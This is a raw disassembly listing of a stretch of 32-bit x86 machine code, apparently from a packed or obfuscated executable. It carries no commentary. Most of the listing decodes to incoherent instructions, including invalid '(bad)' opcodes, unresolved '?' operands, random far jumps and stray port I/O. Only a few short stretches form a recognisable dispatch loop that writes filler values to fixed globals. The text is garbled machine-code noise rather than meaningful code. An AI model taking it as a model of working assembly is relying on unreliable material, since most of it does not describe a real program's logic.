  408a3f:	in     al,0xd6
  408a41:	(bad)  
  408a42:	jns    0x408a30
  408a44:	pushf  
  408a45:	push   eax
  408a46:	mov    ch,BYTE PTR [esp+edx*2]
  408a49:	(bad)  
  408a4a:	(bad)  
  408a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a4d:	mov    ds:0x3fc63d36,al
  408a52:	mov    ds:0x501d857b,al
  408a57:	fist   DWORD PTR [eax]
  408a59:	fbld   TBYTE PTR [ebp-0x43d1a49d]
  408a5f:	pop    ebx
  408a60:	cld    
  408a61:	or     bh,dl
  408a63:	jmp    0xd3d9:0x58f078aa
  408a6a:	adc    BYTE PTR [ecx+edi*4+0x44277b73],ah
  408a71:	(bad)  
  408a72:	test   al,0x66
  408a74:	sub    ax,0xaab8
  408a78:	ret    0xa9c1
  408a7b:	mov    esp,0xddb28639
  408a80:	in     eax,dx
  408a81:	mov    al,0xc1
  408a83:	call   0xba4c:0xb4ed05b3
  408a8a:	pop    ss
  408a8b:	pop    DWORD PTR [edi-0x17]
  408a8e:	pop    ebx
  408a8f:	mov    al,ds:0x215b8b74
  408a94:	out    0x49,al
  408a96:	jg     0x408a34
  408a98:	add    DWORD PTR ds:0xe38a2d01,0x2c02ef50
  408aa2:	out    dx,al
  408aa3:	pop    ebx
  408aa4:	mov    al,ds:0x2f2f63aa
  408aa9:	iret   
  408aaa:	stos   BYTE PTR es:[edi],al
  408aab:	aam    0xc9
  408aad:	jmp    DWORD PTR [ebp-0x3d]
  408ab0:	mov    ah,0xe6
  408ab2:	sahf   
  408ab3:	lds    esp,FWORD PTR [ebx+0x75115a7c]
  408ab9:	sbb    eax,0x728daad5
  408abe:	scas   eax,DWORD PTR es:[edi]
  408abf:	mov    esp,0xa66ed1eb
  408ac4:	pop    es
  408ac5:	(bad)  
  408ac6:	dec    ebx
  408ac7:	xor    eax,ecx
  408ac9:	mov    bl,0xbe
  408acb:	gs nop
  408acd:	aad    0x25
  408acf:	arpl   WORD PTR [esi],bp
  408ad1:	mov    ecx,0xeda00986
  408ad6:	out    dx,eax
  408ad7:	test   BYTE PTR [esi+0x37],ch
  408ada:	fldenv [eax-0x1f5237da]
  408ae0:	lahf   
  408ae1:	mov    edi,0xea0b848a
  408ae6:	mov    ds:0xde65acd5,eax
  408aeb:	xor    eax,0x5eb95375
  408af0:	mov    ah,0xc6
  408af2:	cld    
  408af3:	fldenv [edx+edx*4-0x10a866ec]
  408afa:	push   ecx
  408afb:	scas   al,BYTE PTR es:[edi]
  408afc:	test   eax,0x6b7d5534
  408b01:	fnstcw WORD PTR [eax]
  408b03:	xor    BYTE PTR [ebp+0x6a],0xbf
  408b07:	adc    cl,BYTE PTR [ebx+0x732e4d11]
  408b0d:	cli    
  408b0e:	adc    edi,esp
  408b10:	jno    0x408b1d
  408b12:	sahf   
  408b13:	pop    es
  408b14:	test   al,0x65
  408b16:	sub    ebp,DWORD PTR [eax-0x2c514991]
  408b1c:	push   es
  408b1d:	mov    dl,0xef
  408b1f:	inc    esi
  408b20:	adc    al,0x5d
  408b22:	pusha  
  408b23:	call   0x31b5:0x8b63e93
  408b2a:	mov    DWORD PTR [eax],esp
  408b2c:	daa    
  408b2d:	fidiv  DWORD PTR [ebp+edi*4-0x80]
  408b31:	xchg   esi,eax
  408b32:	add    al,0xea
  408b34:	mov    ebx,0x591892fa
  408b39:	and    al,0xe9
  408b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b3c:	shl    DWORD PTR [ebp+0x55],1
  408b3f:	mov    esp,0xdfa8ea0d
  408b44:	jecxz  0x408af1
  408b46:	or     DWORD PTR ds:0x7e51e52a,0xffffffb0
  408b4d:	cli    
  408b4e:	in     al,0x6c
  408b50:	ror    BYTE PTR [eax-0x42131d5b],cl
  408b56:	lahf   
  408b57:	retf   0x36a2
  408b5a:	push   ecx
  408b5b:	je     0x408b4d
  408b5d:	mov    dh,bh
  408b5f:	iret   
  408b60:	cmovb  ebx,DWORD PTR [edi-0x5d]
  408b64:	ret    0xeff7
  408b67:	cmc    
  408b68:	jmp    0x408b6a
  408b6a:	out    0x7b,al
  408b6c:	sbb    eax,0x24104bce
  408b71:	mov    DWORD PTR [edx],edi
  408b73:	out    0x37,al
  408b75:	(bad)  [ebx-0x70]
  408b78:	dec    ecx
  408b79:	or     BYTE PTR [eax],cl
  408b7b:	jecxz  0x408b2e
  408b7d:	cmp    bh,dh
  408b7f:	pop    edx
  408b80:	in     al,dx
  408b81:	mov    al,0x64
  408b83:	jge    0x408bab
  408b85:	addr16 rcr dh,cl
  408b88:	rcl    dl,cl
  408b8a:	shl    BYTE PTR [edi+ebx*1+0x32],cl
  408b8e:	fcomp  st(3)
  408b90:	pop    eax
  408b91:	stos   BYTE PTR es:[edi],al
  408b92:	inc    esi
  408b93:	cmp    BYTE PTR [edi],ah
  408b95:	push   ss
  408b96:	adc    al,0x3
  408b98:	mov    al,0x41
  408b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b9b:	jnp    0x408bdd
  408b9d:	stos   DWORD PTR es:[edi],eax
  408b9e:	sbb    bh,dh
  408ba0:	repz inc ebp
  408ba2:	and    bh,BYTE PTR [ecx]
  408ba4:	sub    al,0xcd
  408ba6:	push   cs
  408ba7:	xor    al,BYTE PTR [esi+0x4416afbc]
  408bad:	add    al,0x85
  408baf:	or     esi,edi
  408bb1:	bound  eax,QWORD PTR [ebx]
  408bb3:	(bad)  
  408bb5:	or     DWORD PTR [eax+edi*4+0x188441c1],0xab8f69c
  408bc0:	pop    ss
  408bc1:	jmp    0x9d1f8275
  408bc6:	outs   dx,BYTE PTR ds:[esi]
  408bc7:	jge    0x408b7b
  408bc9:	pop    esi
  408bca:	and    al,BYTE PTR [edx-0x2]
  408bcd:	jne    0x408bc6
  408bcf:	retf   0x1dc
  408bd2:	popa   
  408bd3:	mov    al,ds:0x9461e8f5
  408bd8:	mov    ds:0x510b5e30,al
  408bdd:	dec    edx
  408bde:	in     eax,dx
  408bdf:	pop    eax
  408be0:	inc    eax
  408be1:	xchg   ebx,eax
  408be2:	imul   ebp,DWORD PTR [eax+0x54],0xdf6850ce
  408be9:	cmp    ah,BYTE PTR [esi+0x3f]
  408bec:	mov    ds:0xb8d2de9d,eax
  408bf1:	xor    ebx,DWORD PTR [ebx+0x5599774f]
  408bf7:	pop    ss
  408bf8:	mov    esi,0xa22cbae9
  408bfd:	cwde   
  408bfe:	inc    ecx
  408bff:	(bad)  
  408c00:	imul   eax,DWORD PTR [ebp+edx*2-0x21b8d9d3],0xffffffa0
  408c08:	push   cs
  408c09:	fcomp  DWORD PTR [ebx+0x4e0de8cc]
  408c0f:	sub    ebx,esp
  408c11:	mov    cl,0x6b
  408c13:	test   BYTE PTR [esi+0x2eeea932],al
  408c19:	jl     0x408c2a
  408c1b:	clc    
  408c1c:	call   0x713f9f8e
  408c21:	iret   
  408c22:	ror    BYTE PTR [ebx-0x1eaf015],cl
  408c28:	nop
  408c29:	fst    QWORD PTR [edx+0x5646358d]
  408c2f:	or     al,0x7e
  408c31:	out    0x72,eax
  408c33:	retf   0x791c
  408c36:	push   0xb907858d
  408c3b:	sar    DWORD PTR [ebp+0x776808c4],1
  408c41:	cld    
  408c42:	imul   ecx,ebp,0xb1c3e502
  408c48:	and    BYTE PTR [ecx+0x1b],al
  408c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c4c:	mov    ds:0x746ff4d8,eax
  408c51:	jne    0x408c98
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x434543,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434507,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x434537,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x43446f,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x43457f,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x4344f7,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	ror    BYTE PTR [eax-0x1abbe2d8],1
  408ccf:	jle    0x408d4f
  408cd1:	loope  0x408d4b
  408cd3:	jle    0x408d53
  408cd5:	mov    ds:0x9c369a75,al
  408cda:	call   0x1cdbdf8a
  408cdf:	jmp    0x18e7d42b
  408ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce5:	jno    0x408cbb
  408ce7:	and    dh,BYTE PTR [esi]
  408ce9:	mov    esi,0xe63b42ee
  408cee:	xor    edi,0x6d
  408cf1:	fsub   QWORD PTR ds:0x4b1ca7ff
  408cf7:	add    eax,0x1b58cf92
  408cfc:	mov    ebp,gs
  408cfe:	(bad)  
  408d00:	in     eax,dx
  408d01:	imul   DWORD PTR [ebp-0x39191ec5]
  408d07:	pop    edi
  408d08:	or     BYTE PTR [ebp+0x2527671f],0xd
  408d0f:	add    ecx,DWORD PTR [ecx]
  408d11:	push   ebx
  408d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d13:	jo     0x408cf2
  408d15:	pop    ebx
  408d16:	test   ebp,eax
  408d18:	push   cs
  408d19:	fsubrp st(7),st
  408d1b:	rcl    bl,0x1b
  408d1e:	mov    WORD PTR [edx-0x20],?
  408d21:	pop    esp
  408d22:	out    dx,eax
  408d23:	push   edi
  408d24:	dec    esi
  408d25:	test   eax,0x26b2166e
  408d2a:	adc    eax,0x23dc06fb
  408d2f:	pop    ss
  408d30:	aam    0x59
  408d32:	xor    esi,ecx
  408d34:	imul   edx,DWORD PTR [esi],0xcdf8cb26
  408d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d3b:	pop    es
  408d3c:	and    al,0x47
  408d3e:	aad    0xb8
  408d40:	outs   dx,BYTE PTR ds:[esi]
  408d41:	cmp    al,0x41
  408d43:	ss inc ebp
  408d45:	xadd   edx,ecx
  408d48:	jmp    0xa9207349
  408d4d:	fcmovnb st,st(4)
  408d4f:	mov    eax,0x8994e443
  408d54:	out    0x15,eax
  408d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d57:	adc    al,0x84
  408d59:	cli    
  408d5a:	nop
  408d5b:	imul   edx,DWORD PTR [ebx-0x3c],0x67e105aa
  408d62:	hlt    
  408d63:	(bad)  
  408d64:	or     eax,0xe39920a
  408d69:	inc    edi
  408d6a:	xchg   ebx,eax
  408d6b:	xchg   ebp,eax
  408d6c:	scas   eax,DWORD PTR es:[edi]
  408d6d:	out    dx,al
  408d6e:	push   edi
  408d6f:	xlat   BYTE PTR ds:[ebx]
  408d70:	pop    ss
  408d71:	inc    edx
  408d72:	stc    
  408d73:	xor    dl,BYTE PTR [ecx+eax*1+0x7ddb6916]
  408d7a:	dec    ecx
  408d7b:	push   cs
  408d7c:	dec    esi
  408d7d:	xchg   DWORD PTR [eax-0x718de364],ecx
  408d83:	jmp    0x408dde
  408d85:	add    BYTE PTR [edx+0x2a52422a],0x35
  408d8c:	mov    bl,0xc2
  408d8e:	pop    eax
  408d8f:	es mov edx,0x12df580
  408d95:	push   ecx
  408d96:	pop    ss
  408d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d98:	cmp    ebp,ecx
  408d9a:	repz pop esi
  408d9c:	xchg   dl,dl
  408d9e:	dec    edx
  408d9f:	lds    ebx,FWORD PTR [eax-0x19]
  408da2:	fild   DWORD PTR [edx-0x2c]
  408da5:	fwait
  408da6:	stos   DWORD PTR es:[edi],eax
  408da7:	fldenv [ebx-0x31]
  408daa:	push   ds
  408dab:	pop    esp
  408dac:	adc    DWORD PTR [edi+0x2b0d5947],ecx
  408db2:	sbb    DWORD PTR [eax-0x377fb8af],edx
  408db8:	dec    ecx
  408db9:	and    ebp,DWORD PTR [esi-0x36]
  408dbc:	pop    edi
  408dbd:	test   al,0x6c
  408dbf:	xchg   edx,eax
  408dc0:	dec    ecx
  408dc1:	cmp    DWORD PTR [eax-0x421ed212],ebx
  408dc7:	add    eax,0x78214f1f
  408dcc:	adc    ecx,ecx
  408dce:	dec    esp
  408dcf:	aad    0x8f
  408dd1:	adc    BYTE PTR [edx-0xd61ba09],dh
  408dd7:	add    DWORD PTR [ebx-0x25],0x27c71f9a
  408dde:	test   DWORD PTR [ebx-0x61de9329],0xab327738
  408de8:	push   ss
  408de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dea:	jbe    0x408d9c
  408dec:	stos   DWORD PTR es:[edi],eax
  408ded:	push   ecx
  408dee:	push   ebp
  408def:	shr    ah,1
  408df1:	inc    ecx
  408df2:	in     al,dx
  408df3:	push   edx
  408df4:	or     esp,edi
  408df6:	(bad)  
  408df8:	sbb    eax,0x3be13a6b
  408dfd:	retf   
  408dfe:	cmp    esp,eax
  408e00:	jae    0x408e58
  408e02:	sbb    BYTE PTR [ebp-0x66108e1],dl
  408e08:	mov    ah,0xd2
  408e0a:	(bad)  
  408e0b:	inc    ecx
  408e0c:	xchg   BYTE PTR [eax+ecx*2-0x1a],dl
  408e10:	jl     0x408e22
  408e12:	inc    ebp
  408e13:	xor    BYTE PTR [ebx],ah
  408e15:	ins    DWORD PTR es:[edi],dx
  408e16:	out    0x79,eax
  408e18:	lods   al,BYTE PTR ds:[esi]
  408e19:	(bad)  
  408e1b:	xchg   edx,eax
  408e1c:	test   al,0x75
  408e1e:	loopne 0x408e7c
  408e20:	push   0x109ef1ce
  408e25:	pop    edi
  408e26:	inc    DWORD PTR [edi-0x61]
  408e29:	rcr    DWORD PTR [edx-0x4ff85056],0x4f
  408e30:	scas   al,BYTE PTR es:[edi]
  408e31:	sbb    bl,BYTE PTR [esi+0x7bc8c61c]
  408e37:	sbb    DWORD PTR [edx+esi*4+0x43956d1],0xffffff8b
  408e3f:	adc    DWORD PTR [eax-0x417ca5b0],edi
  408e45:	outs   dx,DWORD PTR ds:[esi]
  408e46:	and    eax,0x6cc902db
  408e4b:	fptan  
  408e4d:	cmp    BYTE PTR [ebp+0x1d],0xc2
  408e51:	mov    cl,0xd
  408e53:	das    
  408e54:	sbb    BYTE PTR [eax-0x5b],ch
  408e57:	xchg   bl,ah
  408e59:	(bad)  
  408e5a:	neg    BYTE PTR [ecx]
  408e5c:	and    ebx,DWORD PTR [ebx-0x29cd51ca]
  408e62:	repz test eax,0x9166cffa
  408e68:	(bad)  [ecx]
  408e6a:	mov    ah,0x6c
  408e6c:	push   ebx
  408e6d:	cli    
  408e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e6f:	out    dx,al
  408e70:	jmp    0xda41afb8
  408e75:	pop    eax
  408e76:	outs   dx,BYTE PTR ds:[esi]
  408e77:	stos   DWORD PTR es:[edi],eax
  408e78:	xor    al,0xd5
  408e7a:	iret   
  408e7b:	jmp    0x408e4b
  408e7d:	sub    eax,DWORD PTR [eax+0x5f]
  408e80:	test   DWORD PTR [ebx+eax*2-0x46],esp
  408e84:	adc    ecx,DWORD PTR [edi]
  408e86:	jne    0x408e0d
  408e88:	push   ss
  408e89:	or     eax,0x828fb886
  408e8e:	mov    ecx,0x1ec755d6
  408e93:	adc    DWORD PTR [esi+0x3f],edi
  408e96:	and    esp,esi
  408e98:	adc    esi,ebx
  408e9a:	push   esi
  408e9b:	cmc    
  408e9c:	fiadd  WORD PTR ds:0xc74cd090
  408ea2:	idiv   DWORD PTR [edi-0x62]
  408ea5:	repz aam 0xf6
  408ea8:	cdq    
  408ea9:	ret    0x9446
  408eac:	or     al,0x8
  408eae:	jno    0x408f02
  408eb0:	cmp    ch,BYTE PTR [eax+0x54]
  408eb3:	push   esi
  408eb4:	outs   dx,BYTE PTR ds:[esi]
  408eb5:	mov    edx,0x7f9c89a5
  408eba:	jno    0x408ed4
  408ebc:	cld    
  408ebd:	shl    BYTE PTR [eax+0xebe18ff],1
  408ec3:	sti    
  408ec4:	jecxz  0x408ea2
  408ec6:	nop
  408ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ec8:	push   esp
  408ec9:	sub    ah,BYTE PTR [eax+eiz*2+0x6c1d449b]
  408ed0:	in     eax,dx
  408ed1:	mov    ?,eax
  408ed3:	scas   al,BYTE PTR es:[edi]
  408ed4:	daa    
  408ed5:	pop    es
  408ed6:	inc    esi
  408ed7:	popf   
  408ed8:	fst    QWORD PTR [eax-0x1c]
  408edb:	sub    edx,DWORD PTR [edi]
  408edd:	cmp    esp,ebx
  408edf:	scas   al,BYTE PTR es:[edi]
  408ee0:	xor    bl,0xdb
  408ee3:	packsswb mm4,mm7
  408ee6:	mov    dl,BYTE PTR [ebp+0x5c471553]
  408eec:	inc    ebx
  408eed:	cmp    ecx,edx
  408eef:	xor    DWORD PTR [esi+0x7fda2016],esp
  408ef5:	outs   dx,BYTE PTR ds:[esi]
  408ef6:	add    edi,DWORD PTR [ebx+0x6b888873]
  408efc:	call   0x8db2:0x335517f1
  408f03:	inc    ebx
  408f05:	and    BYTE PTR [edi+0x1858c84d],ah
  408f0b:	inc    ebp
  408f0c:	add    BYTE PTR [edx+0x38],ch
  408f0f:	jl     0x408f5d
  408f11:	sub    ebp,DWORD PTR ds:0x689b0c8e
  408f17:	cli    
  408f18:	cli    
  408f19:	mov    edx,0x200f07b6
  408f1e:	ret    0xeee9
  408f21:	mov    al,0xc5
  408f23:	jle    0x408f0c
  408f25:	mov    bl,0x9e
  408f27:	cld    
  408f28:	jl     0x408f03
  408f2a:	ja     0x408ec4
  408f2c:	or     DWORD PTR [edi+0x11],edi
  408f2f:	adc    DWORD PTR [edi+0x5c],esp
  408f32:	fldenv [edi+0xc]
  408f35:	in     al,0xdb
  408f37:	jne    0x408f59
  408f39:	and    edx,esi
  408f3b:	push   eax
  408f3c:	adc    eax,0x83770364
  408f41:	or     BYTE PTR gs:[eax],al
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x434543,0x434503
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434583
  408f5a:	or     DWORD PTR ds:0x434543,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x43445f,0x4344cf
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x434547,0x4344c7
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x43446b
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x434537,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x43447f,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1+0x524e28e2]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x408fc1
  408fec:	or     ah,cl
  408fee:	pop    esp
  408fef:	pusha  
  408ff0:	imul   ebx,DWORD PTR [esi-0x51a381e4],0x270a3d1a
  408ffa:	daa    
  408ffb:	ror    DWORD PTR [ebx+eax*2],cl
  408ffe:	call   DWORD PTR [ecx]
  409000:	cmp    al,0x49
  409002:	cmp    bh,bh
  409004:	ficom  WORD PTR [eax]
  409006:	mov    ebx,0xaf051b6
  40900b:	push   ds
  40900c:	lea    edx,[ebx-0x66]
  40900f:	pop    ss
  409010:	ja     0x409034
  409012:	pop    edx
  409013:	test   eax,0xefff589d
  409018:	stos   DWORD PTR es:[edi],eax
  409019:	xchg   esp,eax
  40901a:	cmp    ch,BYTE PTR [ebp+0xaa8d919]
  409020:	pop    ds
  409021:	or     ecx,DWORD PTR [edi+0x3]
  409024:	sub    ecx,esi
  409026:	mov    bl,0x43
  409028:	dec    esi
  409029:	add    DWORD PTR [ebp-0x3a],eax
  40902c:	fisub  DWORD PTR [ecx-0x6eeb0f24]
  409032:	fmul   QWORD PTR [ecx]
  409034:	cmp    dh,BYTE PTR [eax+edx*2-0x53]
  409038:	jge    0x409016
  40903a:	pop    ebx
  40903b:	int3   
  40903c:	fwait
  40903d:	cwde   
  40903e:	pop    esp
  40903f:	mov    edi,0xc0e59ca7
  409044:	ret    
  409045:	outs   dx,DWORD PTR ds:[esi]
  409046:	adc    BYTE PTR [edi+0x56],cl
  409049:	adc    BYTE PTR [edi+0xf36958a],0x8f
  409050:	mov    eax,ds:0xb46d271e
  409055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409056:	popf   
  409057:	call   FWORD PTR [ebx-0x7788c474]
  40905d:	sbb    eax,0x226072e5
  409062:	cdq    
  409063:	lods   al,BYTE PTR ds:[esi]
  409064:	jmp    0xd2a52b01
  409069:	mov    eax,ds:0x828ab1eb
  40906e:	adc    DWORD PTR [esi+ebp*2+0x38b7d882],esi
  409075:	add    BYTE PTR [edi],dh
  409077:	mov    edi,ecx
  409079:	mov    ds:0x18e19bfb,eax
  40907e:	sar    DWORD PTR [edi-0x1fcd48f4],1
  409084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409085:	arpl   WORD PTR [ecx],ax
  409087:	xchg   ebx,eax
  409088:	adc    al,0x36
  40908a:	inc    esi
  40908b:	bound  ebx,QWORD PTR [edi-0x74]
  40908e:	cmc    
  40908f:	leave  
  409090:	adc    BYTE PTR ds:0xea8da32,bl
  409096:	or     ebp,ecx
  409098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409099:	mov    DWORD PTR [edi+0x7],esp
  40909c:	loop   0x4090af
  40909e:	jns    0x409024
  4090a0:	jg     0x409098
  4090a2:	retf   0x6cc1
  4090a5:	add    ebx,DWORD PTR [edi+0x70aaa355]
  4090ab:	dec    edi
  4090ac:	fs aad 0x7f
  4090af:	jbe    0x409070
  4090b1:	and    esp,DWORD PTR [ebx+ecx*4+0x251782cd]
  4090b8:	fimul  DWORD PTR [edi-0x5d]
  4090bb:	popf   
  4090bc:	inc    esi
  4090bd:	jns    0x4090d3
  4090bf:	xchg   edx,eax
  4090c0:	(bad)  [eax]
  4090c2:	mov    ebp,0xfba49c2a
  4090c7:	loope  0x40906e
  4090c9:	mov    ?,WORD PTR [esi-0x43]
  4090cc:	and    ah,BYTE PTR [esi-0x2]
  4090cf:	dec    edi
  4090d0:	jg     0x4090b7
  4090d2:	pop    ecx
  4090d3:	xor    edi,DWORD PTR [ebx]
  4090d5:	pop    ds
  4090d6:	cld    
  4090d7:	xlat   BYTE PTR ds:[ebx]
  4090d8:	ret    0xad16
  4090db:	es push ebx
  4090dd:	cmp    edi,DWORD PTR ds:[eax]
  4090e0:	mov    cl,BYTE PTR ds:0xc2009cbb
  4090e6:	lds    esi,FWORD PTR [eax]
  4090e8:	sbb    dh,BYTE PTR ds:[ecx-0x2863fa89]
  4090ef:	in     eax,dx
  4090f0:	and    eax,0x4252743
  4090f5:	jno    0x409174
  4090f7:	ror    BYTE PTR [ebp+0x10428cde],0xf5
  4090fe:	mov    ebp,0x1b0c50b0
  409103:	arpl   WORD PTR [ecx-0x581b6c16],si
  409109:	xor    esi,esi
  40910b:	and    BYTE PTR [ecx+0x3bff7493],0x41
  409112:	stos   BYTE PTR es:[edi],al
  409113:	dec    ecx
  409114:	repnz nop
  409116:	test   ah,dh
  409118:	xor    BYTE PTR [esi-0x1452a243],al
  40911e:	mov    ds:0xa08bae23,al
  409123:	xchg   edx,eax
  409124:	rcr    DWORD PTR [edx],1
  409126:	jnp    0x40913e
  409128:	jmp    0xa125356c
  40912d:	dec    esp
  40912e:	xor    al,0xf1
  409130:	xchg   edi,eax
  409131:	push   es
  409132:	xchg   edi,eax
  409133:	mov    BYTE PTR [edx-0x5a],bh
  409136:	and    ah,BYTE PTR [ebx]
  409138:	(bad)  
  409139:	sti    
  40913a:	mov    WORD PTR [eax-0x3dee45c0],es
  409140:	xchg   ebx,eax
  409141:	adc    BYTE PTR [edi+ebx*4+0x16658ea3],al
  409148:	push   eax
  409149:	jno    0x40911d
  40914b:	mov    eax,ds:0x19ed6cd7
  409150:	pushf  
  409151:	add    dl,bh
  409153:	dec    ax
  409155:	frstor [edi]
  409157:	dec    edx
  409158:	inc    ecx
  409159:	cdq    
  40915a:	jae    0x40913c
  40915c:	or     DWORD PTR [ebp-0x1e48a314],0xbc27fa88
  409166:	fcmovnb st,st(7)
  409168:	mov    esp,0xba6ccbd6
  40916d:	stos   BYTE PTR es:[edi],al
  40916e:	in     al,0x80
  409170:	arpl   di,sp
  409172:	or     esi,DWORD PTR [esi]
  409174:	(bad)  
  409175:	lods   al,BYTE PTR ds:[esi]
  409176:	xor    eax,0x1bd0ef3b
  40917b:	fsubp  st(7),st
  40917d:	inc    edx
  40917e:	repnz ins DWORD PTR es:[edi],dx
  409180:	mov    bl,0xf7
  409182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409183:	enter  0x6921,0x9f
  409187:	inc    eax
  409188:	fist   DWORD PTR [esi-0x3b47b1b8]
  40918e:	sub    ch,BYTE PTR [ebx-0x2b219bb5]
  409194:	call   0xf640f841
  409199:	sub    DWORD PTR [ebx-0x9],edx
  40919c:	mov    al,ds:0xda5157f6
  4091a1:	sub    edx,DWORD PTR [edi+0x51]
  4091a4:	cmp    ebp,DWORD PTR [esi]
  4091a6:	xor    cl,dh
  4091a8:	shl    esi,1
  4091aa:	mov    al,ds:0x4be70b16
  4091af:	fisttp QWORD PTR [ebp-0x250c8114]
  4091b5:	sub    edx,DWORD PTR [ecx-0x45]
  4091b8:	jg     0x4f72502e
  4091be:	call   0x3d92a54d
  4091c3:	push   edx
  4091c4:	imul   esi,DWORD PTR [edx+esi*8-0x77],0x42901d1b
  4091cc:	mov    al,0xbc
  4091ce:	mov    cl,0x6
  4091d0:	outs   dx,BYTE PTR fs:[esi]
  4091d2:	inc    ebx
  4091d3:	(bad)  
  4091d4:	pusha  
  4091d5:	xor    eax,0xaac71a60
  4091da:	sub    al,BYTE PTR [edi+0x746d407a]
  4091e0:	fwait
  4091e1:	xchg   ecx,eax
  4091e2:	shl    DWORD PTR [edx-0x1],0xc9
  4091e6:	add    esi,ecx
  4091e8:	add    ah,BYTE PTR [ebp+0x27]
  4091eb:	neg    esi
  4091ed:	xchg   esp,ecx
  4091ef:	retf   0x688
  4091f2:	jns    0x40919e
  4091f4:	xor    al,0x23
  4091f6:	add    DWORD PTR [edi],ebx
  4091f8:	sub    al,0xb5
  4091fa:	(bad)  
  4091fb:	popf   
  4091fc:	les    edi,FWORD PTR [ecx+ebp*4+0x69]
  409200:	push   ebx
  409201:	scas   eax,DWORD PTR es:[edi]
  409202:	sti    
  409203:	push   ds
  409204:	inc    eax
  409205:	fild   QWORD PTR [ecx]
  409207:	std    
  409208:	push   ebp
  409209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40920a:	add    dl,BYTE PTR [ebx+0x58ad07f0]
  409210:	jmp    0x5eff4102
  409215:	xor    DWORD PTR [esi],edx
  409217:	mov    al,0x9d
  409219:	out    0xff,al
  40921b:	std    
  40921c:	stos   BYTE PTR es:[edi],al
  40921d:	lahf   
  40921e:	sbb    eax,0x674f7afc
  409223:	inc    ebx
  409224:	adc    DWORD PTR [esi-0x2d],ecx
  409227:	jge    0x4091fc
  409229:	xor    al,0x6f
  40922b:	xchg   ebp,eax
  40922c:	ss or  eax,0x2fe7e981
  409232:	fdivr  DWORD PTR [ecx]
  409234:	lock cmp al,0x70
  409237:	xchg   esi,eax
  409238:	mov    esp,0xcab78468
  40923d:	and    edx,DWORD PTR [edx]
  40923f:	jg     0x40923c
  409241:	adc    eax,0x52964f3
  409246:	jecxz  0x409240
  409248:	push   ds
  409249:	ss int3 
  40924b:	pop    esp
  40924c:	xchg   DWORD PTR [edx*8-0x6f245c68],esi
  409253:	pop    ebp
  409254:	sbb    DWORD PTR ds:0xc303c633,ecx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
